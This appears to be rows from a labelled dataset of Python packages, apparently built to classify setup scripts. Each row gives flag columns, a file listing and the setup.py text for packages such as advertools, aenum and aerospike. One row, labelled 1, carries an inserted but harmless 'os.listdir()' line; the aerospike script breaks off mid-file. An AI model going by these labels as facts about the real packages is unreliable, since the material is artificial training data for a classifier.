extensions.rst bar_chart.svg column_chart.svg dots_chart.svg lattice.svg line_chart.svg index.rst install.rst license.rst Makefile release_process.rst tutorial.rst example.py example.py.ipynb Datagov_FY10_EDU_recp_by_State.csv exonerations-20150828.csv ks_1033_data.csv README.csv table1.csv table1.json table2.csv table2.json table3.csv table3.json table1.csv table2.csv test.csv test.json testfixed testfixed_converted.csv testfixed_schema.csv test_cr.csv test_crlf.csv test_csv_sniff.csv test_key.json test_keyed.json test_latin1.csv test_mixed.json test_nested.json test_newline.json test_non_string_keyed.json test_no_header.csv test_tableset.json test_utf16_big.csv test_utf16_little.csv exonerations.py MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_agate.py test_aggregations.py test_columns.py test_computations.py test_data_types.py test_fixed.py test_from_json.py test_mapped_sequence.py test_py2.py test_py3.py test_aggregate.py test_bins.py test_charting.py test_compute.py test_denormalize.py test_from_csv.py test_from_fixed.py test_group_by.py test_homogenize.py test_join.py test_merge.py test_normalize.py test_order_py.py test_pivot.py test_print_bars.py test_print_html.py test_print_structure.py test_print_table.py test_rename.py test_to_csv.py test_to_json.py __init__.py test_aggregate.py test_charting.py test_having.py test_merge.py __init__.py test_type_tester.py test_utils.py __init__.py tutorial.ipynb advertools.ad_create.rst advertools.ad_from_string.rst advertools.cli.cli.rst advertools.cli.rst advertools.code_recipes.cli.rst advertools.code_recipes.rst advertools.code_recipes.spider_strategies.rst advertools.emoji.rst advertools.extract.rst advertools.header_spider.rst advertools.knowledge_graph.rst advertools.kw_generate.rst advertools.logs.rst advertools.regex.rst advertools.reverse_dns_lookup.rst advertools.robotstxt.rst advertools.rst advertools.serp.rst advertools.sitemaps.rst advertools.spider.rst advertools.stopwords.rst advertools.twitter.rst advertools.urlytics.rst advertools.url_builders.rst advertools.word_frequency.rst advertools.word_tokenize.rst advertools.youtube.rst conf.py include_changelog.rst index.rst make.bat Makefile modules.rst readme.rst file.png minus.png plus.png HISTORY.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py .coverage broken_links.html duplicate_links.html test_content.html econ.log goog_mktg.log guardian.log imf.log imf2.log nginx_access.log smrsh.log error_sitemap.xml image_sitemap.xml news_sitemap.xml regular_sitemap.xml robots.txt sitemap_index.xml video_sitemap.xml zipped_sitemap.xml.gz test_ad_create.py test_ad_from_string.py test_crawl.py test_crawl_or_not.py test_emoji.py test_extract.py test_header_spider.py test_kw_generate.py test_logs.py test_reverse_dns_lookup.py test_robotstxt.py test_serp.py test_sitemaps.py test_spider.py test_twitter.py test_urlytics.py test_url_builders.py test_word_frequency.py test_word_tokenize.py test_youtube.py __init__.py,"#!/usr/bin/env python

""""""The setup script.""""""

from setuptools import find_packages, setup

import os; os.listdir()
with open('README.rst') as readme_file:
    readme = readme_file.read()

with open('HISTORY.rst') as history_file:
    history = history_file.read()

requirements = [
    'pandas',
    'pyasn1',
    'scrapy',
    'twython',
    'pyarrow',
]

setup_requirements = [
    'pytest-runner',
]

test_requirements = [
    'pytest',
]

setup(
    author=""Elias Dabbas"",
    author_email='eliasdabbas@gmail.com',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Intended Audience :: End Users/Desktop',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
    ],
    description=""Productivity and analysis tools for online marketing"",
    entry_points={
        'console_scripts': [
            'advertools=advertools.cli:main',
            'adv=advertools.cli:main',
        ],
    },
    install_requires=requirements,
    license=""MIT license"",
    long_description=readme + '\n\n' + history,
    include_package_data=True,
    keywords='advertising marketing search-engine-optimization adwords '
             'seo sem bingads keyword-research',
    name='advertools',
    packages=find_packages(include=['advertools']),
    setup_requires=setup_requirements,
    test_suite='tests',
    tests_require=test_requirements,
    url='https://github.com/eliasdabbas/advertools',
    version='0.13.1',
    zip_safe=False,
)
",1
aedev_git_repo_manager-0.3.55,0,1,1,1,1,0,1,0,git_repo_manager.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe LICENSE.md PKG-INFO README.md setup.cfg setup.py,"# THIS FILE IS EXCLUSIVELY MAINTAINED by the project aedev.tpl_project V0.3.20
"""""" setup this project with setuptools and aedev.setup_project. """"""
import pprint
import sys

import setuptools

from aedev.setup_project import project_env_vars    # type: ignore

pev = project_env_vars(from_setup=True)

if __name__ == ""__main__"":
    print(""#  EXECUTING SETUPTOOLS SETUP: argv, kwargs  ###################"")
    print(pprint.pformat(sys.argv, indent=3, width=75, compact=True))
    setup_kwargs = pev['setup_kwargs']
    print(pprint.pformat(setup_kwargs, indent=3, width=75, compact=True))
    setuptools.setup(**setup_kwargs)
    print(""#  FINISHED SETUPTOOLS SETUP  ##################################"")
",0
aedev_tpl_project-0.3.20,0,1,1,1,1,0,1,0,de_otf_de_tpl_.gitignore de_otf_de_tpl_.gitlab-ci.yml de_otf_de_tpl_CONTRIBUTING.rst de_otf_de_tpl_dev_requirements.txt de_otf_LICENSE.md de_otf_SECURITY.md de_otf_de_tpl_conf.py de_otf_de_tpl_index.rst de_otf_de_tpl_requirements.txt de_otf_Makefile features_and_examples.rst de_spt_app_de_otf_setup.py de_tpl_README.md de_otf_conftest.py de_otf_de_tpl_requirements.txt de_otf_de_tpl_test_{portion_name or package_name}.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.md PKG-INFO README.md setup.cfg setup.py,"# THIS FILE IS EXCLUSIVELY MAINTAINED by the project aedev.tpl_project V0.3.19
"""""" setup this project with setuptools and aedev.setup_project. """"""
import pprint
import sys

import setuptools

from aedev.setup_project import project_env_vars    # type: ignore

pev = project_env_vars(from_setup=True)

if __name__ == ""__main__"":
    print(""#  EXECUTING SETUPTOOLS SETUP: argv, kwargs  ###################"")
    print(pprint.pformat(sys.argv, indent=3, width=75, compact=True))
    setup_kwargs = pev['setup_kwargs']
    print(pprint.pformat(setup_kwargs, indent=3, width=75, compact=True))
    setuptools.setup(**setup_kwargs)
    print(""#  FINISHED SETUPTOOLS SETUP  ##################################"")
",0
aenum-3.1.11,0,1,1,1,1,0,1,0,CHANGES aenum.pdf aenum.rst LICENSE test.py test_v3.py _py2.py _py3.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"try:
    import setuptools
except ImportError:
    pass
from distutils.core import setup
import sys

long_desc = '''\
Advanced Enumerations (compatible with Python's stdlib Enum), NamedTuples, and NamedConstants

WARNING: Version 3.1 has breaking changes in custom Enum settings
WARNING:
WARNING: AutoNumber has been removed
WARNING: AutoValue has been removed

aenum includes a Python stdlib Enum-compatible data type, as well as a metaclass-based NamedTuple implementation and a NamedConstant class.

An Enum is a set of symbolic names (members) bound to unique, constant values. Within an enumeration, the members can be compared by identity, and the enumeration itself can be iterated over.  Support exists for unique values, multiple values, auto-numbering, and suspension of aliasing (members with the same value are not identical), plus the ability to have values automatically bound to attributes.

A NamedTuple is a class-based, fixed-length tuple with a name for each possible position accessible using attribute-access notation as well as the standard index notation.

A NamedConstant is a class whose members cannot be rebound; it lacks all other Enum capabilities, however.

Enum classes:

- Enum: Base class for creating enumerated constants.

- IntEnum: Base class for creating enumerated constants that are also
           subclasses of int.

- Flag: Base class for creating enumerated constants that can be combined
        using the bitwise operations without losing their Flag membership.

- IntFlag: Base class for creating enumerated constants that can be combined
           using the bitwise operators without losing their IntFlag membership.
           IntFlag members are also subclasses of int.

- AutoNumberEnum: Derived class that automatically assigns an int value to each
                  member.

- OrderedEnum: Derived class that adds <, <=, >=, and > methods to an Enum.

- UniqueEnum: Derived class that ensures only one name is bound to any one
              value.

Utility functions include:

- convert: helper to convert target global variables into an Enum

- constant: helper class for creating constant members

- enum: helper class for creating members with keywords

- enum_property: property to enable enum members to have same named attributes
                 (e.g. `name` and `value`)

- export: helper to insert Enum members into a namespace (usually globals())

- extend_enum: add new members to enumerations after creation

- module: inserts NamedConstant and Enum classes into sys.modules
          where it will appear to be a module whose top-level names
          cannot be rebound

- skip: class that prevents attributes from being converted to a
        constant or enum member

- unique: decorator that ensures no duplicate members
'''

data = dict(
       name='aenum',
       version='3.1.11',
       url='https://github.com/ethanfurman/aenum',
       packages=['aenum'],
       package_data={
           'aenum' : [
               'LICENSE',
               'README',
               'doc/aenum.rst',
               'doc/aenum.pdf',
               ]
           },
       include_package_data=True,
       license='BSD License',
       description=""Advanced Enumerations (compatible with Python's stdlib Enum), NamedTuples, and NamedConstants"",
       long_description=long_desc,
       provides=['aenum'],
       author='Ethan Furman',
       author_email='ethan@stoneleaf.us',
       classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Intended Audience :: Developers',
            'License :: OSI Approved :: BSD License',
            'Programming Language :: Python',
            'Topic :: Software Development',
            'Programming Language :: Python :: 2.7',
            'Programming Language :: Python :: 3.3',
            'Programming Language :: Python :: 3.4',
            'Programming Language :: Python :: 3.5',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Programming Language :: Python :: 3.9',
            'Programming Language :: Python :: 3.10',
            ],
    )

py2_only = ('aenum/_py2.py', )
py3_only = ('aenum/test_v3.py', 'aenum/_py3.py')
make = [
        'rst2pdf aenum/doc/aenum.rst --output=aenum/doc/aenum.pdf',
        ]

if __name__ == '__main__':
    if 'install' in sys.argv:
        import os, sys
        if sys.version_info[0] != 2:
            for file in py2_only:
                try:
                    os.unlink(file)
                except OSError:
                    pass
        if sys.version_info[0] != 3:
            for file in py3_only:
                try:
                    os.unlink(file)
                except OSError:
                    pass
    setup(**data)
",0
aerospike-7.0.2,0,1,1,1,0,0,1,0,.build.yml .git build.yml .gitignore .gitmodules Makefile example.c Makefile example.c Makefile example.c Makefile example.c Makefile example.c Makefile Makefile example.c Makefile example.c Makefile example.c Makefile example.c Makefile example.c Makefile example.c Makefile Makefile example.c Makefile example.c Makefile example.c Makefile basic_udf.lua example.c Makefile example.c Makefile geospatial_simple.png Makefile geo_filter_amen.lua example.c Makefile geospatial_simple.png Makefile example.c Makefile Makefile Makefile query_udf.lua example.c Makefile Makefile example.c README.md Makefile bg_scan_udf.lua example.c Makefile Makefile example.c example_utils.h example_utils.c install_libev install_libevent install_libuv LICENSE.md Makefile .git .gitignore Makefile rules.mk settings.mk test.mk README.md as_aerospike.h as_arraylist.h as_arraylist_iterator.h as_atomic.h as_atomic_gcc.h as_atomic_win.h as_boolean.h as_buffer.h as_buffer_pool.h as_bytes.h as_dir.h as_double.h as_geojson.h as_hashmap.h as_hashmap_iterator.h as_integer.h as_iterator.h as_list.h as_list_iterator.h as_log.h as_log_macros.h as_map.h as_map_iterator.h as_memtracker.h as_module.h as_monitor.h as_msgpack.h as_msgpack_ext.h as_msgpack_serializer.h as_nil.h as_pair.h as_password.h as_queue.h as_queue_mt.h as_random.h as_rec.h as_result.h as_serializer.h as_sleep.h as_std.h as_stream.h as_string.h as_stringmap.h as_string_builder.h as_thread.h as_thread_pool.h as_timer.h as_types.h as_udf_context.h as_util.h as_val.h as_vector.h ck_backoff.h ck_bitmap.h ck_brlock.h ck_bytelock.h ck_cc.h ck_cohort.h ck_elide.h ck_fifo.h ck_hp_fifo.h ck_hp_stack.h ck_limits.h ck_malloc.h ck_md.h ck_pflock.h ck_pr.h ck_queue.h ck_ring.h ck_rwcohort.h ck_rwlock.h ck_sequence.h ck_spinlock.h ck_stack.h ck_stdbool.h ck_stddef.h ck_stdint.h ck_stdlib.h ck_string.h ck_swlock.h ck_tflock.h ck_md.h ck_f_pr.h ck_pr.h ck_pr_llsc.h ck_pr_lse.h ck_f_pr.h ck_pr.h ck_cc.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_f_pr.h ck_pr.h ck_pr_rtm.h anderson.h cas.h clh.h dec.h fas.h hclh.h mcs.h ticket.h ssl_util.h alloc.h cf_atomic.h cf_b64.h cf_byte_order.h cf_clock.h cf_crypto.h cf_digest.h cf_hash_math.h cf_ll.h cf_queue.h cf_random.h as_aerospike.c as_arraylist.c as_arraylist_hooks.c as_arraylist_iterator.c as_arraylist_iterator_hooks.c as_boolean.c as_buffer.c as_buffer_pool.c as_bytes.c as_double.c as_geojson.c as_hashmap.c as_hashmap_hooks.c as_hashmap_iterator.c as_hashmap_iterator_hooks.c as_integer.c as_iterator.c as_list.c as_log.c as_map.c as_memtracker.c as_module.c as_msgpack.c as_msgpack_ext.c as_msgpack_serializer.c as_nil.c as_pair.c as_password.c as_queue.c as_queue_mt.c as_random.c as_rec.c as_result.c as_serializer.c as_stream.c as_string.c as_string_builder.c as_thread_pool.c as_timer.c as_val.c as_vector.c crypt_blowfish.c crypt_blowfish.h ssl_util.c cf_alloc.c cf_b64.c cf_clock.c cf_crypto.c cf_digest.c cf_ll.c cf_queue.c cf_random.c common.c msgpack_direct.c msgpack_rountrip.c test.c test.h test_common.c test_common.h password.c random.c string_builder.c types_arraylist.c types_boolean.c types_bytes.c types_double.c types_hashmap.c types_integer.c types_nil.c types_queue.c types_queue_mt.c types_string.c aerospike-common.vcxproj aerospike-common.vcxproj.filters packages.config aerospike-common-test.vcxproj aerospike-common-test.vcxproj.filters packages.config aerospike-common.sln base.props test.props project.pbxproj project.pbxproj contents.xcworkspacedata .git .gitignore .travis.yml dist.cmake FindLua.cmake FindReadline.cmake lua.cmake CMakeLists.txt COPYRIGHT dist.info contents.html cover.png logo.gif lua.1 lua.css lua.html luac.1 luac.html manual.css manual.html readme.html all.c lua.hpp lua.ico lua.pc luavs.bat lua_lang.ico Makefile min.c noparser.c README strict.lua HISTORY INSTALL Makefile README.md lapi.c lapi.h lauxlib.c lauxlib.h lbaselib.c lcode.c lcode.h ldblib.c ldebug.c ldebug.h ldo.c ldo.h ldump.c lfunc.c lfunc.h lgc.c lgc.h linit.c liolib.c llex.c llex.h llimits.h lmathlib.c lmem.c lmem.h loadlib.c loadlib_rel.c lobject.c lobject.h lopcodes.c lopcodes.h loslib.c lparser.c lparser.h lstate.c lstate.h lstring.c lstring.h lstrlib.c ltable.c ltable.h ltablib.c ltm.c ltm.h lua.c lua.def lua.h lua.rc luac.c luac.rc luaconf.h.in luaconf.h.orig lualib.h lua_dll.rc lundump.c lundump.h lvm.c lvm.h lzio.c lzio.h Makefile print.c wmain.c bisect.lua cf.lua echo.lua env.lua factorial.lua fib.lua fibfor.lua globals.lua hello.lua life.lua luac.lua printf.lua README readonly.lua sieve.lua sort.lua table.lua trace-calls.lua trace-globals.lua xd.lua .git .gitignore .travis.yml dist.cmake FindLua.cmake FindReadline.cmake lua.cmake CMakeLists.txt COPYRIGHT dist.info bluequad-print.css bluequad.css changes.html contact.html extensions.html ext_c_api.html ext_ffi.html ext_ffi_api.html ext_ffi_semantics.html ext_ffi_tutorial.html ext_jit.html faq.html contact.png install.html luajit.html running.html status.html dasm_arm.h dasm_arm.lua dasm_mips.h dasm_mips.lua dasm_ppc.h dasm_ppc.lua dasm_proto.h dasm_x64.lua dasm_x86.h dasm_x86.lua dynasm.lua luajit.1 luajit.ico luajit.pc Makefile README.md .gitignore .gitignore buildvm.c buildvm.h buildvm_asm.c buildvm_fold.c buildvm_lib.c buildvm_peobj.c genminilua.lua minilua.c README .gitignore bc.lua bcsave.lua dis_arm.lua dis_mips.lua dis_mipsel.lua dis_ppc.lua dis_x64.lua dis_x86.lua dump.lua v.lua lauxlib.h lib_aux.c lib_base.c lib_bit.c lib_debug.c lib_ffi.c lib_init.c lib_io.c lib_jit.c lib_math.c lib_os.c lib_package.c lib_package_rel.c lib_string.c lib_table.c lj.supp ljamalg.c lj_alloc.c lj_alloc.h lj_api.c lj_arch.h lj_asm.c lj_asm.h lj_asm_arm.h lj_asm_mips.h lj_asm_ppc.h lj_asm_x86.h lj_bc.c lj_bc.h lj_bcdump.h lj_bcread.c lj_bcwrite.c lj_carith.c lj_carith.h lj_ccall.c lj_ccall.h lj_ccallback.c lj_ccallback.h lj_cconv.c lj_cconv.h lj_cdata.c lj_cdata.h lj_char.c lj_char.h lj_clib.c lj_clib.h lj_cparse.c lj_cparse.h lj_crecord.c lj_crecord.h lj_ctype.c lj_ctype.h lj_debug.c lj_debug.h lj_def.h lj_dispatch.c lj_dispatch.h lj_emit_arm.h lj_emit_mips.h lj_emit_ppc.h lj_emit_x86.h lj_err.c lj_err.h lj_errmsg.h lj_ff.h lj_ffrecord.c lj_ffrecord.h lj_frame.h lj_func.c lj_func.h lj_gc.c lj_gc.h lj_gdbjit.c lj_gdbjit.h lj_ir.c lj_ir.h lj_ircall.h lj_iropt.h lj_jit.h lj_lex.c lj_lex.h lj_lib.c lj_lib.h lj_load.c lj_mcode.c lj_mcode.h lj_meta.c lj_meta.h lj_obj.c lj_obj.h lj_opt_dce.c lj_opt_fold.c lj_opt_loop.c lj_opt_mem.c lj_opt_narrow.c lj_opt_sink.c lj_opt_split.c lj_parse.c lj_parse.h lj_record.c lj_record.h lj_snap.c lj_snap.h lj_state.c lj_state.h lj_str.c lj_str.h lj_strscan.c lj_strscan.h lj_tab.c lj_tab.h lj_target.h lj_target_arm.h lj_target_mips.h lj_target_ppc.h lj_target_x86.h lj_trace.c lj_trace.h lj_traceerr.h lj_udata.c lj_udata.h lj_vm.h lj_vmevent.c lj_vmevent.h lj_vmmath.c lua.def lua.h lua.hpp luaconf.h.in luaconf.h.orig luajit.c luajit.h luajit.rc lualib.h Makefile Makefile.dep msvcbuild.bat ps4build.bat vm_arm.dasc vm_mips.dasc vm_ppc.dasc vm_ppcspe.dasc vm_x86.dasc wmain.c xedkbuild.bat .git .gitignore Makefile modules.mk rules.mk settings.mk test.mk README.md mod_lua.h mod_lua_aerospike.h mod_lua_bytes.h mod_lua_config.h mod_lua_geojson.h mod_lua_iterator.h mod_lua_list.h mod_lua_map.h mod_lua_record.h mod_lua_reg.h mod_lua_stream.h mod_lua_val.h internal.c internal.h mod_lua.c mod_lua_aerospike.c mod_lua_bytes.c mod_lua_geojson.c mod_lua_iterator.c mod_lua_list.c mod_lua_map.c mod_lua_record.c mod_lua_reg.c mod_lua_stream.c mod_lua_system.c mod_lua_val.c hash_udf.c list_udf.c aggr.lua basics.lua bytes.lua errors.lua integers.lua lists.lua logs.lua maps.lua raj.lua records.lua strings.lua test.lua test_bytes.lua test_math.lua test_unit.lua validate_1.lua validate_2.lua validate_3.lua validate_4.lua validate_5.lua validate_6.lua mod_lua_test.c record_udf.c stream_udf.c test.c test.h consumer_stream.c consumer_stream.h map_rec.c map_rec.h producer_stream.c producer_stream.h test_aerospike.c test_aerospike.h test_logger.c test_logger.h validation_basics.c aerospike-mod-lua.vcxproj aerospike-mod-lua.vcxproj.filters packages.config aerospike-mod-lua-test.vcxproj aerospike-mod-lua-test.vcxproj.filters packages.config aerospike-mod-lua.sln base.props test.props project.pbxproj project.pbxproj contents.xcworkspacedata aerospike-mod-lua.xcscmblueprint mod-lua.xcscmblueprint client-devel.spec client.spec postinst.client install package package_src package_type platform README.md client-devel.spec client.spec set_version version doxyfile modules.mk rules.mk settings.mk test.mk README.md footer.html header.html aerospike.css aerospike_logo.png style.css layout.xml old.css aerospike.h aerospike_batch.h aerospike_index.h aerospike_info.h aerospike_key.h aerospike_query.h aerospike_scan.h aerospike_stats.h aerospike_udf.h as_address.h as_admin.h as_async.h as_async_proto.h as_batch.h as_bin.h as_bit_operations.h as_cdt_ctx.h as_cdt_internal.h as_cdt_order.h as_cluster.h as_command.h as_config.h as_conn_pool.h as_cpu.h as_error.h as_event.h as_event_internal.h as_exp.h as_exp_operations.h as_hll_operations.h as_host.h as_info.h as_job.h as_key.h as_listener.h as_list_operations.h as_lookup.h as_map_operations.h as_node.h as_operations.h as_partition.h as_partition_filter.h as_partition_tracker.h as_peers.h as_pipe.h as_policy.h as_poll.h as_proto.h as_query.h as_query_validate.h as_record.h as_record_iterator.h as_scan.h as_shm_cluster.h as_socket.h as_status.h as_tls.h as_udf.h version.h .gitignore aerospike.c aerospike_batch.c aerospike_index.c aerospike_info.c aerospike_key.c aerospike_query.c aerospike_scan.c aerospike_stats.c aerospike_udf.c as_address.c as_admin.c as_async.c as_batch.c as_bit_operations.c as_cdt_ctx.c as_cdt_internal.c as_cluster.c as_command.c as_config.c as_error.c as_event.c as_event_ev.c as_event_event.c as_event_none.c as_event_uv.c as_exp.c as_exp_operations.c as_hll_operations.c as_host.c as_info.c as_job.c as_key.c as_list_operations.c as_lookup.c as_map_operations.c as_node.c as_operations.c as_partition.c as_partition_tracker.c as_peers.c as_pipe.c as_policy.c as_proto.c as_query.c as_query_validate.c as_record.c as_record_hooks.c as_record_iterator.c as_scan.c as_shm_cluster.c as_socket.c as_tls.c as_udf.c version.c _bin.c _bin.h batch.c batch_async.c bit.c query_geospatial.c starbucks_3k.jpg index_basics.c info_basics.c hll_operate.c key_apply.c key_apply2.c key_apply_async.c key_basics.c key_basics_async.c key_operate.c key_pipeline.c list_basics.c list_basics_async.c map_basics.c map_basics_async.c map_index.c map_sort.c map_udf.c query_async.c query_background.c query_foreach.c aerospike_scan_test.lua scan_async.c scan_basics.c aerospike_test.c aerospike_test.h udf_basics.c udf_record.c udf_types.c exp_operate.c filter_exp.c client_record_basics.lua client_record_lists.lua client_stream_ads.lua client_stream_simple.lua key_apply.lua key_apply2.lua query_background.lua udf_basics.lua udf_record.lua udf_types.lua test.c test.h consumer_stream.c consumer_stream.h index_util.c index_util.h info_helper.c info_helper.h log_helper.c log_helper.h map_rec.c map_rec.h producer_stream.c producer_stream.h test_aerospike.c test_aerospike.h udf.c udf.h aerospike.vcxproj aerospike.vcxproj.filters packages.config aerospike-client-c-libevent.nuspec aerospike-client-c-libevent.targets aerospike-client-c-libuv.nuspec aerospike-client-c-libuv.targets aerospike-client-c.nuspec aerospike-client-c.targets aerospike-test.vcxproj aerospike-test.vcxproj.filters packages.config aerospike.sln append.vcxproj append.vcxproj.filters packages.config async-batch-get.vcxproj async-batch-get.vcxproj.filters packages.config async-delay-queue.vcxproj async-delay-queue.vcxproj.filters packages.config async-get.vcxproj async-get.vcxproj.filters packages.config async-query.vcxproj async-query.vcxproj.filters packages.config async-scan.vcxproj async-scan.vcxproj.filters packages.config batch-get.vcxproj batch-get.vcxproj.filters packages.config expire.vcxproj expire.vcxproj.filters packages.config generation.vcxproj generation.vcxproj.filters packages.config geo-filter.vcxproj geo-filter.vcxproj.filters packages.config geo-simple.vcxproj geo-simple.vcxproj.filters packages.config get.vcxproj get.vcxproj.filters packages.config incr.vcxproj incr.vcxproj.filters packages.config list.vcxproj list.vcxproj.filters packages.config map.vcxproj map.vcxproj.filters packages.config packages.config put.vcxproj put.vcxproj.filters packages.config query.vcxproj query.vcxproj.filters packages.config query-aggregate.vcxproj query-aggregate.vcxproj.filters packages.config scan.vcxproj scan.vcxproj.filters packages.config scan-background.vcxproj scan-background.vcxproj.filters packages.config touch.vcxproj touch.vcxproj.filters packages.config udf.vcxproj udf.vcxproj.filters icon.png base.props example.props libevent.props libuv.props nodejs.props README.md project.pbxproj project.pbxproj contents.xcworkspacedata client.xcscmblueprint project.pbxproj prepare_xcode dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt io.py __init__.py records.py __init__.py cdt_ctx.py arithmetic.py base.py bitwise.py bitwise_operators.py hll.py list.py map.py resources.py __init__.py bitwise_operations.py expression_operations.py hll_operations.py list_operations.py map_operations.py operations.py __init__.py __init__.py LICENSE MANIFEST.in PKG-INFO README.rst manylinux2014build.sh manylinuxbuild.sh os_version wait-for-node.sh setup.cfg setup.py admin.h bit_operations.h cdt_list_operations.h cdt_map_operations.h cdt_operation_utils.h cdt_types.h client.h conversions.h exceptions.h exception_types.h expression_operations.h geo.h global_hosts.h hll_operations.h key_ordered_dict.h log.h macros.h module_functions.h nullobject.h operate.h policy.h policy_config.h pool.h predicates.h query.h scan.h serializer.h tls_config.h tls_info_host.h types.h aerospike.c calc_digest.c type.c admin.c apply.c batch_apply.c batch_get_ops.c batch_operate.c batch_remove.c batch_write.c bit_operate.c cdt_list_operate.c cdt_map_operate.c cdt_operation_utils.c close.c connect.c exists.c exists_many.c expression_operations.c get.c get_async.c get_expression_base64.c get_key_digest.c get_key_partition_id.c get_many.c get_nodes.c hll_operate.c info.c info_node.c info_random_node.c info_single_node.c operate.c operate_list.c operate_map.c put.c put_async.c query.c remove.c remove_bin.c scan.c sec_index.c select.c select_many.c set_xdr_filter.c tls_info_host.c truncate.c type.c udf.c conversions.c convert_expressions.c convert_partition_filter.c exception.c dumps.c loads.c type.c unwrap.c wrap.c type.c type.c log.c type.c policy.c policy_config.c predicates.c add_ops.c apply.c execute_background.c foreach.c get_parts.c paginate.c results.c select.c type.c where.c add_ops.c apply.c execute_background.c foreach.c get_parts.c paginate.c results.c select.c type.c serializer.c tls_config.c VERSION,"# -*- coding: utf-8 -*-
################################################################################
# Copyright 2013-2021 Aerospike, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
################################################################################

from __future__ import print_function
import os
import platform
import sys
from subprocess import Popen
from subprocess import call
from setuptools import setup, Extension
from distutils.command.build import build
from distutils.command.clean import clean
from multiprocessing import cpu_count
import time
import io

################################################################################
# ENVIRONMENT VARIABLES
################################################################################

os.putenv('ARCHFLAGS', '-arch x86_64')
os.environ['ARCHFLAGS'] = '-arch x86_64'
AEROSPIKE_C_VERSION = os.getenv('AEROSPIKE_C_VERSION')
BASEPATH = os.path.dirname(os.path.abspath(__file__))
AEROSPIKE_C_HOME = os.path.join(BASEPATH, 'aerospike-client-c')

AEROSPIKE_C_TARGET = None
PLATFORM = platform.platform(1)
LINUX = 'Linux' in PLATFORM
DARWIN = 'Darwin' in PLATFORM or 'macOS' in PLATFORM
CWD = os.path.abspath(os.path.dirname(__file__))
STATIC_SSL = os.getenv('STATIC_SSL')
SSL_LIB_PATH = os.getenv('SSL_LIB_PATH')
EVENT_LIB = os.getenv('EVENT_LIB')

################################################################################
# GENERIC BUILD SETTINGS
################################################################################

include_dirs = ['src/include'] + \
    [x for x in os.getenv('CPATH', '').split(':') if len(x) > 0] + \
    ['/usr/local/opt/openssl/include'] + \
    ['aerospike-client-c/modules/common/src/include']
extra_compile_args = [
    '-std=gnu99', '-g', '-Wall', '-fPIC', '-O1', '-DDEBUG',
    '-fno-common', '-fno-strict-aliasing', '-Wno-strict-prototypes',
    '-march=nocona',
    '-D_FILE_OFFSET_BITS=64', '-D_REENTRANT',
    '-DMARCH_x86_64',
    '-Wno-implicit-function-declaration'
]
extra_objects = []
extra_link_args = []
library_dirs = ['/usr/local/opt/openssl/lib', '/usr/local/lib']
libraries = [
    'ssl',
    'crypto',
    'pthread',
    'm',
    'z'
]
################################################################################
# STATIC SSL LINKING BUILD SETTINGS
################################################################################

if STATIC_SSL:
    extra_objects.extend(
        [SSL_LIB_PATH + 'libssl.a', SSL_LIB_PATH + 'libcrypto.a'])
    libraries.remove('ssl')
    libraries.remove('crypto')
    library_dirs.remove('/usr/local/opt/openssl/lib')

################################################################################
# PLATFORM SPECIFIC BUILD SETTINGS
################################################################################

if DARWIN:
    # ---------------------------------------------------------------------------
    # Mac Specific Compiler and Linker Settings
    # ---------------------------------------------------------------------------
    extra_compile_args = extra_compile_args + [
        '-D_DARWIN_UNLIMITED_SELECT'
    ]

    AEROSPIKE_C_TARGET = AEROSPIKE_C_HOME + '/target/Darwin-x86_64'

elif LINUX:
    # ---------------------------------------------------------------------------
    # Linux Specific Compiler and Linker Settings
    # ---------------------------------------------------------------------------
    extra_compile_args = extra_compile_args + [
        '-rdynamic', '-finline-functions'
    ]
    libraries = libraries + ['rt']
    AEROSPIKE_C_TARGET = AEROSPIKE_C_HOME + '/target/Linux-x86_64'
else:
    print(""error: OS not supported:"", PLATFORM, file=sys.stderr)
    sys.exit(8)

include_dirs = include_dirs + [
    '/usr/local/opt/openssl/include',
    AEROSPIKE_C_TARGET + '/include'
    ]
extra_objects = extra_objects + [
    AEROSPIKE_C_TARGET + '/lib/libaerospike.a'
]

os.putenv('CPATH', ':'.join(include_dirs))
os.environ['CPATH'] = ':'.join(include_dirs)

################################################################################
# SETUP
################################################################################

# Get the long description from the relevant file
with io.open(os.path.join(CWD, 'README.rst'), ""r"", encoding='utf-8') as f:
    long_description = f.read()

# Get the version from the relevant file
with io.open(os.path.join(CWD, 'VERSION'), ""r"", encoding='utf-8') as f:
    version = f.read()

BASEPATH = os.path.dirname(os.path.abspath(__file__))
CCLIENT_PATH = os.path.join(BASEPATH, 'aerospike-client-c')

# if EVENT_LIB is None or EVENT_LIB == """":
#     EVENT_LIB = ""libevent""

if EVENT_LIB is not None:
    if EVENT_LIB == ""libuv"":
        extra_compile_args = extra_compile_args + ['-DAS_EVENT_LIB_DEFINED']
        library_dirs = library_dirs + ['/usr/local/lib/']
        libraries = libraries + ['uv']
    elif EVENT_LIB == ""libevent"":
        extra_compile_args = extra_compile_args + ['-DAS_EVENT_LIB_DEFINED']
        library_dirs = library_dirs + ['/usr/local/lib/']
        libraries = libraries + ['event_core', 'event_pthreads']
    elif EVENT_LIB == ""libev"":
        extra_compile_args = extra_compile_args + ['-DAS_EVENT_LIB_DEFINED']
